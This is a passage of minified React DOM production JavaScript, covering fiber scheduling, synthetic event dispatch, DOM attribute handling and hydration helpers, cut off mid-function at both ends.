ia.onPostCommitFiberRoot=="function")try{ia.onPostCommitFiberRoot(kt,n)}catch{}return!0}finally{N.p=o,E.T=s,ou(e,a)}}function nu(e,a,t){a=ba(t,a),a=zn(e.stateNode,a,2),e=dr(e,a,2),e!==null&&(Gt(e,2),Na(e))}function he(e,a,t){if(e.tag===3)nu(e,e,t);else for(;a!==null;){if(a.tag===3){nu(a,e,t);break}else if(a.tag===1){var s=a.stateNode;if(typeof a.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(vr===null||!vr.has(s))){e=ba(t,e),t=mm(2),s=dr(a,t,2),s!==null&&(um(t,s,a,e),Gt(s,2),Na(s));break}}a=a.return}}function nl(e,a,t){var s=e.pingCache;if(s===null){s=e.pingCache=new Lh;var o=new Set;s.set(a,o)}else o=s.get(a),o===void 0&&(o=new Set,s.set(a,o));o.has(t)||(Wn=!0,o.add(t),e=Ph.bind(null,e,a,t),a.then(e,e))}function Ph(e,a,t){var s=e.pingCache;s!==null&&s.delete(a),e.pingedLanes|=e.suspendedLanes&t,e.warmLanes&=~t,ve===e&&(te&t)===t&&(_e===4||_e===3&&(te&62914560)===te&&300>Ma()-el?(de&2)===0&&zt(e,0):Jn|=t,qt===te&&(qt=0)),Na(e)}function lu(e,a){a===0&&(a=sc()),e=bt(e,a),e!==null&&(Gt(e,a),Na(e))}function Uh(e){var a=e.memoizedState,t=0;a!==null&&(t=a.retryLane),lu(e,t)}function Ih(e,a){var t=0;switch(e.tag){case 13:var s=e.stateNode,o=e.memoizedState;o!==null&&(t=o.retryLane);break;case 19:s=e.stateNode;break;case 22:s=e.stateNode._retryCache;break;default:throw Error(m(314))}s!==null&&s.delete(a),lu(e,t)}function kh(e,a){return Lr(e,a)}var Fo=null,Xt=null,ll=!1,Go=!1,cl=!1,Jr=0;function Na(e){e!==Xt&&e.next===null&&(Xt===null?Fo=Xt=e:Xt=Xt.next=e),Go=!0,ll||(ll=!0,Gh())}function _s(e,a){if(!cl&&Go){cl=!0;do for(var t=!1,s=Fo;s!==null;){if(e!==0){var o=s.pendingLanes;if(o===0)var n=0;else{var c=s.suspendedLanes,x=s.pingedLanes;n=(1<<31-na(42|e)+1)-1,n&=o&~(c&~x),n=n&201326741?n&201326741|1:n?n|2:0}n!==0&&(t=!0,uu(s,n))}else n=te,n=Ys(s,s===ve?n:0,s.cancelPendingCommit!==null||s.timeoutHandle!==-1),(n&3)===0||Ft(s,n)||(t=!0,uu(s,n));s=s.next}while(t);cl=!1}}function Fh(){cu()}function cu(){Go=ll=!1;var e=0;Jr!==0&&(Jh()&&(e=Jr),Jr=0);for(var a=Ma(),t=null,s=Fo;s!==null;){var o=s.next,n=du(s,a);n===0?(s.next=null,t===null?Fo=o:t.next=o,o===null&&(Xt=t)):(t=s,(e!==0||(n&3)!==0)&&(Go=!0)),s=o}_s(e)}function du(e,a){for(var t=e.suspendedLanes,s=e.pingedLanes,o=e.expirationTimes,n=e.pendingLanes&-62914561;0<n;){var c=31-na(n),x=1<<c,p=o[c];p===-1?((x&t)===0||(x&s)!==0)&&(o[c]=hp(x,a)):p<=a&&(e.expiredLanes|=x),n&=~x}if(a=ve,t=te,t=Ys(e,e===a?t:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),s=e.callbackNode,t===0||e===a&&(me===2||me===9)||e.cancelPendingCommit!==null)return s!==null&&s!==null&&tr(s),e.callbackNode=null,e.callbackPriority=0;if((t&3)===0||Ft(e,t)){if(a=t&-t,a===e.callbackPriority)return a;switch(s!==null&&tr(s),Ai(t)){case 2:case 8:t=ac;break;case 32:t=Hs;break;case 268435456:t=rc;break;default:t=Hs}return s=mu.bind(null,e),t=Lr(t,s),e.callbackPriority=a,e.callbackNode=t,a}return s!==null&&s!==null&&tr(s),e.callbackPriority=2,e.callbackNode=null,2}function mu(e,a){if(Ze!==0&&Ze!==5)return e.callbackNode=null,e.callbackPriority=0,null;var t=e.callbackNode;if(ko()&&e.callbackNode!==t)return null;var s=te;return s=Ys(e,e===ve?s:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),s===0?null:(Zm(e,s,a),du(e,Ma()),e.callbackNode!=null&&e.callbackNode===t?mu.bind(null,e):null)}function uu(e,a){if(ko())return null;Zm(e,a,!0)}function Gh(){ef(function(){(de&6)!==0?Lr(ec,Fh):cu()})}function dl(){return Jr===0&&(Jr=tc()),Jr}function xu(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:eo(""+e)}function pu(e,a){var t=a.ownerDocument.createElement("input");return t.name=a.name,t.value=a.value,e.id&&t.setAttribute("form",e.id),a.parentNode.insertBefore(t,a),e=new FormData(e),t.parentNode.removeChild(t),e}function Vh(e,a,t,s,o){if(a==="submit"&&t&&t.stateNode===o){var n=xu((o[aa]||null).action),c=s.submitter;c&&(a=(a=c[aa]||null)?xu(a.formAction):c.getAttribute("formAction"),a!==null&&(n=a,c=null));var x=new so("action","action",null,s,o);e.push({event:x,listeners:[{instance:null,listener:function(){if(s.defaultPrevented){if(Jr!==0){var p=c?pu(o,c):new FormData(o);Dn(t,{pending:!0,data:p,method:o.method,action:n},null,p)}}else typeof n=="function"&&(x.preventDefault(),p=c?pu(o,c):new FormData(o),Dn(t,{pending:!0,data:p,method:o.method,action:n},n,p))},currentTarget:o}]})}}for(var ml=0;ml<Qi.length;ml++){var ul=Qi[ml],Hh=ul.toLowerCase(),Zh=ul[0].toUpperCase()+ul.slice(1);Ra(Hh,"on"+Zh)}Ra(Zc,"onAnimationEnd"),Ra(Qc,"onAnimationIteration"),Ra(Yc,"onAnimationStart"),Ra("dblclick","onDoubleClick"),Ra("focusin","onFocus"),Ra("focusout","onBlur"),Ra(dh,"onTransitionRun"),Ra(mh,"onTransitionStart"),Ra(uh,"onTransitionCancel"),Ra(Kc,"onTransitionEnd"),nt("onMouseEnter",["mouseout","mouseover"]),nt("onMouseLeave",["mouseout","mouseover"]),nt("onPointerEnter",["pointerout","pointerover"]),nt("onPointerLeave",["pointerout","pointerover"]),wr("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),wr("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),wr("onBeforeInput",["compositionend","keypress","textInput","paste"]),wr("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),wr("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),wr("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ms="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Qh=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Ms));function hu(e,a){a=(a&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],o=s.event;s=s.listeners;e:{var n=void 0;if(a)for(var c=s.length-1;0<=c;c--){var x=s[c],p=x.instance,v=x.currentTarget;if(x=x.listener,p!==n&&o.isPropagationStopped())break e;n=x,o.currentTarget=v;try{n(o)}catch(C){To(C)}o.currentTarget=null,n=p}else for(c=0;c<s.length;c++){if(x=s[c],p=x.instance,v=x.currentTarget,x=x.listener,p!==n&&o.isPropagationStopped())break e;n=x,o.currentTarget=v;try{n(o)}catch(C){To(C)}o.currentTarget=null,n=p}}}}function re(e,a){var t=a[Ri];t===void 0&&(t=a[Ri]=new Set);var s=e+"__bubble";t.has(s)||(fu(a,e,2,!1),t.add(s))}function xl(e,a,t){var s=0;a&&(s|=4),fu(t,e,s,a)}var Vo="_reactListening"+Math.random().toString(36).slice(2);function pl(e){if(!e[Vo]){e[Vo]=!0,cc.forEach(function(t){t!=="selectionchange"&&(Qh.has(t)||xl(t,!1,e),xl(t,!0,e))});var a=e.nodeType===9?e:e.ownerDocument;a===null||a[Vo]||(a[Vo]=!0,xl("selectionchange",!1,a))}}function fu(e,a,t,s){switch(Uu(a)){case 2:var o=Sf;break;case 8:o=Af;break;default:o=Ml}t=o.bind(null,a,t,e),o=void 0,!zi||a!=="touchstart"&&a!=="touchmove"&&a!=="wheel"||(o=!0),s?o!==void 0?e.addEventListener(a,t,{capture:!0,passive:o}):e.addEventListener(a,t,!0):o!==void 0?e.addEventListener(a,t,{passive:o}):e.addEventListener(a,t,!1)}function hl(e,a,t,s,o){var n=s;if((a&1)===0&&(a&2)===0&&s!==null)e:for(;;){if(s===null)return;var c=s.tag;if(c===3||c===4){var x=s.stateNode.containerInfo;if(x===o)break;if(c===4)for(c=s.return;c!==null;){var p=c.tag;if((p===3||p===4)&&c.stateNode.containerInfo===o)return;c=c.return}for(;x!==null;){if(c=st(x),c===null)return;if(p=c.tag,p===5||p===6||p===26||p===27){s=n=c;continue e}x=x.parentNode}}s=s.return}Ac(function(){var v=n,C=Ni(t),M=[];e:{var y=Wc.get(e);if(y!==void 0){var S=so,Q=e;switch(e){case"keypress":if(ro(t)===0)break e;case"keydown":case"keyup":S=kp;break;case"focusin":Q="focus",S=Pi;break;case"focusout":Q="blur",S=Pi;break;case"beforeblur":case"afterblur":S=Pi;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":S=Cc;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":S=Dp;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":S=Vp;break;case Zc:case Qc:case Yc:S=Np;break;case Kc:S=Zp;break;case"scroll":case"scrollend":S=Mp;break;case"wheel":S=Yp;break;case"copy":case"cut":case"paste":S=zp;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":S=Mc;break;case"toggle":case"beforetoggle":S=Wp}var V=(a&4)!==0,pe=!V&&(e==="scroll"||e==="scrollend"),b=V?y!==null?y+"Capture":null:y;V=[];for(var h=v,g;h!==null;){var _=h;if(g=_.stateNode,_=_.tag,_!==5&&_!==26&&_!==27||g===null||b===null||(_=Zt(h,b),_!=null&&V.push(Os(h,_,g))),pe)break;h=h.return}0<V.length&&(y=new S(y,Q,null,t,C),M.push({event:y,listeners:V}))}}if((a&7)===0){e:{if(y=e==="mouseover"||e==="pointerover",S=e==="mouseout"||e==="pointerout",y&&t!==qi&&(Q=t.relatedTarget||t.fromElement)&&(st(Q)||Q[tt]))break e;if((S||y)&&(y=C.window===C?C:(y=C.ownerDocument)?y.defaultView||y.parentWindow:window,S?(Q=t.relatedTarget||t.toElement,S=v,Q=Q?st(Q):null,Q!==null&&(pe=j(Q),V=Q.tag,Q!==pe||V!==5&&V!==27&&V!==6)&&(Q=null)):(S=null,Q=v),S!==Q)){if(V=Cc,_="onMouseLeave",b="onMouseEnter",h="mouse",(e==="pointerout"||e==="pointerover")&&(V=Mc,_="onPointerLeave",b="onPointerEnter",h="pointer"),pe=S==null?y:Ht(S),g=Q==null?y:Ht(Q),y=new V(_,h+"leave",S,t,C),y.target=pe,y.relatedTarget=g,_=null,st(C)===v&&(V=new V(b,h+"enter",Q,t,C),V.target=g,V.relatedTarget=pe,_=V),pe=_,S&&Q)a:{for(V=S,b=Q,h=0,g=V;g;g=Bt(g))h++;for(g=0,_=b;_;_=Bt(_))g++;for(;0<h-g;)V=Bt(V),h--;for(;0<g-h;)b=Bt(b),g--;for(;h--;){if(V===b||b!==null&&V===b.alternate)break a;V=Bt(V),b=Bt(b)}V=null}else V=null;S!==null&&bu(M,y,S,V,!1),Q!==null&&pe!==null&&bu(M,pe,Q,V,!0)}}e:{if(y=v?Ht(v):window,S=y.nodeName&&y.nodeName.toLowerCase(),S==="select"||S==="input"&&y.type==="file")var X=wc;else if(Lc(y))if(Xc)X=nh;else{X=oh;var ee=sh}else S=y.nodeName,!S||S.toLowerCase()!=="input"||y.type!=="checkbox"&&y.type!=="radio"?v&&Ti(v.elementType)&&(X=wc):X=ih;if(X&&(X=X(e,v))){zc(M,X,t,C);break e}ee&&ee(e,y,v),e==="focusout"&&v&&y.type==="number"&&v.memoizedProps.value!=null&&Di(y,"number",y.value)}switch(ee=v?Ht(v):window,e){case"focusin":(Lc(ee)||ee.contentEditable==="true")&&(pt=ee,Vi=v,as=null);break;case"focusout":as=Vi=pt=null;break;case"mousedown":Hi=!0;break;case"contextmenu":case"mouseup":case"dragend":Hi=!1,Vc(M,t,C);break;case"selectionchange":if(ch)break;case"keydown":case"keyup":Vc(M,t,C)}var F;if(Ii)e:{switch(e){case"compositionstart":var Z="onCompositionStart";break e;case"compositionend":Z="onCompositionEnd";break e;case"compositionupdate":Z="onCompositionUpdate";break e}Z=void 0}else xt?qc(e,t)&&(Z="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(Z="onCompositionStart");Z&&(Oc&&t.locale!=="ko"&&(xt||Z!=="onCompositionStart"?Z==="onCompositionEnd"&&xt&&(F=Rc()):(ir=C,wi="value"in ir?ir.value:ir.textContent,xt=!0)),ee=Ho(v,Z),0<ee.length&&(Z=new _c(Z,e,null,t,C),M.push({event:Z,listeners:ee}),F?Z.data=F:(F=Nc(t),F!==null&&(Z.data=F)))),(F=$p?eh(e,t):ah(e,t))&&(Z=Ho(v,"onBeforeInput"),0<Z.length&&(ee=new _c("onBeforeInput","beforeinput",null,t,C),M.push({event:ee,listeners:Z}),ee.data=F)),Vh(M,e,v,t,C)}hu(M,a)})}function Os(e,a,t){return{instance:e,listener:a,currentTarget:t}}function Ho(e,a){for(var t=a+"Capture",s=[];e!==null;){var o=e,n=o.stateNode;if(o=o.tag,o!==5&&o!==26&&o!==27||n===null||(o=Zt(e,t),o!=null&&s.unshift(Os(e,o,n)),o=Zt(e,a),o!=null&&s.push(Os(e,o,n))),e.tag===3)return s;e=e.return}return[]}function Bt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function bu(e,a,t,s,o){for(var n=a._reactName,c=[];t!==null&&t!==s;){var x=t,p=x.alternate,v=x.stateNode;if(x=x.tag,p!==null&&p===s)break;x!==5&&x!==26&&x!==27||v===null||(p=v,o?(v=Zt(t,n),v!=null&&c.unshift(Os(t,v,p))):o||(v=Zt(t,n),v!=null&&c.push(Os(t,v,p)))),t=t.return}c.length!==0&&e.push({event:a,listeners:c})}var Yh=/\r\n?/g,Kh=/\u0000|\uFFFD/g;function gu(e){return(typeof e=="string"?e:""+e).replace(Yh,`
`).replace(Kh,"")}function vu(e,a){return a=gu(a),gu(e)===a}function Zo(){}function xe(e,a,t,s,o,n){switch(t){case"children":typeof s=="string"?a==="body"||a==="textarea"&&s===""||dt(e,s):(typeof s=="number"||typeof s=="bigint")&&a!=="body"&&dt(e,""+s);break;case"className":Ws(e,"class",s);break;case"tabIndex":Ws(e,"tabindex",s);break;case"dir":case"role":case"viewBox":case"width":case"height":Ws(e,t,s);break;case"style":yc(e,s,n);break;case"data":if(a!=="object"){Ws(e,"data",s);break}case"src":case"href":if(s===""&&(a!=="a"||t!=="href")){e.removeAttribute(t);break}if(s==null||typeof s=="function"||typeof s=="symbol"||typeof s=="boolean"){e.removeAttribute(t);break}s=eo(""+s),e.setAttribute(t,s);break;case"action":case"formAction":if(typeof s=="function"){e.setAttribute(t,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof n=="function"&&(t==="formAction"?(a!=="input"&&xe(e,a,"name",o.name,o,null),xe(e,a,"formEncType",o.formEncType,o,null),xe(e,a,"formMethod",o.formMethod,o,null),xe(e,a,"formTarget",o.formTarget,o,null)):(xe(e,a,"encType",o.encType,o,null),xe(e,a,"method",o.method,o,null),xe(e,a,"target",o.target,o,null)));if(s==null||typeof s=="symbol"||typeof s=="boolean"){e.removeAttribute(t);break}s=eo(""+s),e.setAttribute(t,s);break;case"onClick":s!=null&&(e.onclick=Zo);break;case"onScroll":s!=null&&re("scroll",e);break;case"onScrollEnd":s!=null&&re("scrollend",e);break;case"dangerouslySetInnerHTML":if(s!=null){if(typeof s!="object"||!("__html"in s))throw Error(m(61));if(t=s.__html,t!=null){if(o.children!=null)throw Error(m(60));e.innerHTML=t}}break;case"multiple":e.multiple=s&&typeof s!="function"&&typeof s!="symbol";break;case"muted":e.muted=s&&typeof s!="function"&&typeof s!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(s==null||typeof s=="function"||typeof s=="boolean"||typeof s=="symbol"){e.removeAttribute("xlink:href");break}t=eo(""+s),e.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",t);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":s!=null&&typeof s!="function"&&typeof s!="symbol"?e.setAttribute(t,""+s):e.removeAttribute(t);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":s&&typeof s!="function"&&typeof s!="symbol"?e.setAttribute(t,""):e.removeAttribute(t);break;case"capture":case"download":s===!0?e.setAttribute(t,""):s!==!1&&s!=null&&typeof s!="function"&&typeof s!="symbol"?e.setAttribute(t,s):e.removeAttribute(t);break;case"cols":case"rows":case"size":case"span":s!=null&&typeof s!="function"&&typeof s!="symbol"&&!isNaN(s)&&1<=s?e.setAttribute(t,s):e.removeAttribute(t);break;case"rowSpan":case"start":s==null||typeof s=="function"||typeof s=="symbol"||isNaN(s)?e.removeAttribute(t):e.setAttribute(t,s);break;case"popover":re("beforetoggle",e),re("toggle",e),Ks(e,"popover",s);break;case"xlinkActuate":Pa(e,"http://www.w3.org/1999/xlink","xlink:actuate",s);break;case"xlinkArcrole":Pa(e,"http://www.w3.org/1999/xlink","xlink:arcrole",s);break;case"xlinkRole":Pa(e,"http://www.w3.org/1999/xlink","xlink:role",s);break;case"xlinkShow":Pa(e,"http://www.w3.org/1999/xlink","xlink:show",s);break;case"xlinkTitle":Pa(e,"http://www.w3.org/1999/xlink","xlink:title",s);break;case"xlinkType":Pa(e,"http://www.w3.org/1999/xlink","xlink:type",s);break;case"xmlBase":Pa(e,"http://www.w3.org/XML/1998/namespace","xml:base",s);break;case"xmlLang":Pa(e,"http://www.w3.org/XML/1998/namespace","xml:lang",s);break;case"xmlSpace":Pa(e,"http://www.w3.org/XML/1998/namespace","xml:space",s);break;case"is":Ks(e,"is",s);break;case"innerText":case"textContent":break;default:(!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(t=Cp.get(t)||t,Ks(e,t,s))}}function fl(e,a,t,s,o,n){switch(t){case"style":yc(e,s,n);break;case"dangerouslySetInnerHTML":if(s!=null){if(typeof s!="object"||!("__html"in s))throw Error(m(61));if(t=s.__html,t!=null){if(o.children!=null)throw Error(m(60));e.innerHTML=t}}break;case"children":typeof s=="string"?dt(e,s):(typeof s=="number"||typeof s=="bigint")&&dt(e,""+s);break;case"onScroll":s!=null&&re("scroll",e);break;case"onScrollEnd":s!=null&&re("scrollend",e);break;case"onClick":s!=null&&(e.onclick=Zo);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!dc.hasOwnProperty(t))e:{if(t[0]==="o"&&t[1]==="n"&&(o=t.endsWith("Capture"),a=t.slice(2,o?t.length-7:void 0),n=e[aa]||null,n=n!=null?n[t]:null,typeof n=="function"&&e.removeEventListener(a,n,o),typeof s=="function")){typeof n!="function"&&n!==null&&(t in e?e[t]=null:e.hasAttribute(t)&&e.removeAttribute(t)),e.addEventListener(a,s,o);break e}t in e?e[t]=s:s===!0?e.setAttribute(t,""):Ks(e,t,s)}}}function Qe(e,a,t){switch(a){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":re("error",e),re("load",e);var s=!1,o=!1,n;for(n in t)if(t.hasOwnProperty(n)){var c=t[n];if(c!=null)switch(n){case"src":s=!0;break;case"srcSet":o=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(m(137,a));default:xe(e,a,n,c,t,null)}}o&&xe(e,a,"srcSet",t.srcSet,t,null),s&&xe(e,a,"src",t.src,t,null);return;case"input":re("invalid",e);var x=n=c=o=null,p=null,v=null;for(s in t)if(t.hasOwnProperty(s)){var C=t[s];if(C!=null)switch(s){case"name":o=C;break;case"type":c=C;break;case"checked":p=C;break;case"defaultChecked":v=C;break;case"value":n=C;break;case"defaultValue":x=C;break;case"children":case"dangerouslySetInnerHTML":if(C!=null)throw Error(m(137,a));break;default:xe(e,a,s,C,t,null)}}bc(e,n,x,p,v,c,o,!1),Js(e);return;case"select":re("invalid",e),s=c=n=null;for(o in t)if(t.hasOwnProperty(o)&&(x=t[o],x!=null))switch(o){case"value":n=x;break;case"defaultValue":c=x;break;case"multiple":s=x;default:xe(e,a,o,x,t,null)}a=n,t=c,e.multiple=!!s,a!=null?ct(e,!!s,a,!1):t!=null&&ct(e,!!s,t,!0);return;case"textarea":re("invalid",e),n=o=s=null;for(c in t)if(t.hasOwnProperty(c)&&(x=t[c],x!=null))switch(c){case"value":s=x;break;case"defaultValue":o=x;break;case"children":n=x;break;case"dangerouslySetInnerHTML":if(x!=null)throw Error(m(91));break;default:xe(e,a,c,x,t,null)}vc(e,s,o,n),Js(e);return;case"option":for(p in t)t.hasOwnProperty(p)&&(s=t[p],s!=null)&&(p==="selected"?e.selected=s&&typeof s!="function"&&typeof s!="symbol":xe(e,a,p,s,t,null));return;case"dialog":re("beforetoggle",e),re("toggle",e),re("cancel",e),re("close",e);break;case"iframe":case"object":re("load",e);break;case"video":case"audio":for(s=0;s<Ms.length;s++)re(Ms[s],e);break;case"image":re("error",e),re("load",e);break;case"details":re("toggle",e);break;case"embed":case"source":case"link":re("error",e),re("load",e);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(v in t)if(t.hasOwnProperty(v)&&(s=t[v],s!=null))switch(v){case"children":case"dangerouslySetInnerHTML":throw Error(m(137,a));default:xe(e,a,v,s,t,null)}return;default:if(Ti(a)){for(C in t)t.hasOwnProperty(C)&&(s=t[C],s!==void 0&&fl(e,a,C,s,t,void 0));return}}for(x in t)t.hasOwnProperty(x)&&(s=t[x],s!=null&&xe(e,a,x,s,t,null))}function Wh(e,a,t,s){switch(a){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var o=null,n=null,c=null,x=null,p=null,v=null,C=null;for(S in t){var M=t[S];if(t.hasOwnProperty(S)&&M!=null)switch(S){case"checked":break;case"value":break;case"defaultValue":p=M;default:s.hasOwnProperty(S)||xe(e,a,S,null,s,M)}}for(var y in s){var S=s[y];if(M=t[y],s.hasOwnProperty(y)&&(S!=null||M!=null))switch(y){case"type":n=S;break;case"name":o=S;break;case"checked":v=S;break;case"defaultChecked":C=S;break;case"value":c=S;break;case"defaultValue":x=S;break;case"children":case"dangerouslySetInnerHTML":if(S!=null)throw Error(m(137,a));break;default:S!==M&&xe(e,a,y,S,s,M)}}Oi(e,c,x,p,v,C,n,o);return;case"select":S=c=x=y=null;for(n in t)if(p=t[n],t.hasOwnProperty(n)&&p!=null)switch(n){case"value":break;case"multiple":S=p;default:s.hasOwnProperty(n)||xe(e,a,n,null,s,p)}for(o in s)if(n=s[o],p=t[o],s.hasOwnProperty(o)&&(n!=null||p!=null))switch(o){case"value":y=n;break;case"defaultValue":x=n;break;case"multiple":c=n;default:n!==p&&xe(e,a,o,n,s,p)}a=x,t=c,s=S,y!=null?ct(e,!!t,y,!1):!!s!=!!t&&(a!=null?ct(e,!!t,a,!0):ct(e,!!t,t?[]:"",!1));return;case"textarea":S=y=null;for(x in t)if(o=t[x],t.hasOwnProperty(x)&&o!=null&&!s.hasOwnProperty(x))switch(x){case"value":break;case"children":break;default:xe(e,a,x,null,s,o)}for(c in s)if(o=s[c],n=t[c],s.hasOwnProperty(c)&&(o!=null||n!=null))switch(c){case"value":y=o;break;case"defaultValue":S=o;break;case"children":break;case"dangerouslySetInnerHTML":if(o!=null)throw Error(m(91));break;default:o!==n&&xe(e,a,c,o,s,n)}gc(e,y,S);return;case"option":for(var Q in t)y=t[Q],t.hasOwnProperty(Q)&&y!=null&&!s.hasOwnProperty(Q)&&(Q==="selected"?e.selected=!1:xe(e,a,Q,null,s,y));for(p in s)y=s[p],S=t[p],s.hasOwnProperty(p)&&y!==S&&(y!=null||S!=null)&&(p==="selected"?e.selected=y&&typeof y!="function"&&typeof y!="symbol":xe(e,a,p,y,s,S));return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var V in t)y=t[V],t.hasOwnProperty(V)&&y!=null&&!s.hasOwnProperty(V)&&xe(e,a,V,null,s,y);for(v in s)if(y=s[v],S=t[v],s.hasOwnProperty(v)&&y!==S&&(y!=null||S!=null))switch(v){case"children":case"dangerouslySetInnerHTML":if(y!=null)throw Error(m(137,a));break;default:xe(e,a,v,y,s,S)}return;default:if(Ti(a)){for(var pe in t)y=t[pe],t.hasOwnProperty(pe)&&y!==void 0&&!s.hasOwnProperty(pe)&&fl(e,a,pe,void 0,s,y);for(C in s)y=s[C],S=t[C],!s.hasOwnProperty(C)||y===S||y===void 0&&S===void 0||fl(e,a,C,y,s,S);return}}for(var b in t)y=t[b],t.hasOwnProperty(b)&&y!=null&&!s.hasOwnProperty(b)&&xe(e,a,b,null,s,y);for(M in s)y=s[M],S=t[M],!s.hasOwnProperty(M)||y===S||y==null&&S==null||xe(e,a,M,y,s,S)}var bl=null,gl=null;function Qo(e){return e.nodeType===9?e:e.ownerDocument}function ju(e){switch(e){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function yu(e,a){if(e===0)switch(a){case"svg":return 1;case"math":return 2;default:return 0}return e===1&&a==="foreignObject"?0:e}function vl(e,a){return e==="textarea"||e==="noscript"||typeof a.children=="string"||typeof a.children=="number"||typeof a.children=="bigint"||typeof a.dangerouslySetInnerHTML=="object"&&a.dangerouslySetInnerHTML!==null&&a.dangerouslySetInnerHTML.__html!=null}var jl=null;function Jh(){var e=window.event;return e&&e.type==="popstate"?e===jl?!1:(jl=e,!0):(jl=null,!1)}var Su=typeof setTimeout=="function"?setTimeout:void 0,$h=typeof clearTimeout=="function"?clearTimeout:void 0,Au=typeof Promise=="function"?Promise:void 0,ef=typeof queueMicrotask=="function"?queueMicrotask:typeof Au<"u"?function(e){return Au.resolve(null).then(e).catch(af)}:Su;function af(e){setTimeout(function(){throw e})}function Sr(e){return e==="head"}function Ru(e,a){var t=a,s=0,o=0;do{var n=t.nextSibling;if(e.removeChild(t),n&&n.nodeType===8)if(t=n.data,t==="/$"){if(0<s&&8>s){t=s;var c=e.ownerDocument;if(t&1&&Ds(c.documentElement),t&2&&Ds(c.body),t&4)for(t=c.head,Ds(t),c=t.firstChild;c;){var x=c.nextSibling,p=c.nodeName;c[Vt]||p==="SCRIPT"||p==="STYLE"||p==="LINK"&&c.rel.toLowerCase()==="stylesheet"||t.removeChild(c),c=x}}if(o===0){e.removeChild(n),Bs(a);return}o--}else t==="$"||t==="$?"||t==="$!"?o++:s=t.charCodeAt(0)-48;else s=0;t=n}while(t);Bs(a)}function yl(e){var a=e.firstChild;for(a&&a.nodeType===10&&(a=a.nextSibling);a;){var t=a;switch(a=a.nextSibling,t.nodeName){case"HTML":case"HEAD":case"BODY":yl(t),Ei(t);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(t.rel.toLowerCase()==="stylesheet")continue}e.removeChild(t)}}function rf(e,a,t,s){for(;e.nodeType===1;){var o=t;if(e.nodeName.toLowerCase()!==a.toLowerCase()){if(!s&&(e.nodeName!=="INPUT"||e.type!=="hidden"))break}else if(s){if(!e[Vt])switch(a){case"meta":if(!e.hasAttribute("itemprop"))break;return e;case"link":if(n=e.getAttribute("rel"),n==="stylesheet"&&e.hasAttribute("data-precedence"))break;if(n!==o.rel||e.getAttribute("href")!==(o.href==null||o.href===""?null:o.href)||e.getAttribute("crossorigin")!==(o.crossOrigin==null?null:o.crossOrigin)||e.getAttribute("title")!==(o.title==null?null:o.title))break;return e;case"style":if(e.hasAttribute("data-precedence"))break;return e;case"script":if(n=e.getAttribute("src"),(n!==(o.src==null?null:o.src)||e.getAttribute("type")!==(o.type==null?null:o.type)||e.getAttribute("crossorigin")!==(o.crossOrigin==null?null:o.crossOrigin))&&n&&e.hasAttribute("async")&&!e.hasAttribute("itemprop"))break;return e;default:return e}}else if(a==="input"&&e.type==="hidden"){var n=o.name==null?null:""+o.name;if(o.type==="hidden"&&e.getAttribute("name")===n)return e}else return e;if(e=Ca(e.nextSibling),e===null)break}return null}function tf(e,a,t){if(a==="")return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!t||(e=Ca(e.nextSibling),e===null))return null;return e}function Sl(e){return e.data==="$!"||e.data==="$?"&&e.ownerDocument.readyState==="complete"}function sf(e,a){var t=e.ownerDocument;if(e.data!=="$?"||t.readyState==="complete")a();else{var s=function(){a(),t.removeEventListener("DOMContentLoaded",s)};t.addEventListener("DOMContentLoaded",s),e._reactRetry=s}}function Ca(e){for(;e!=null;e=e.nextSibling){var 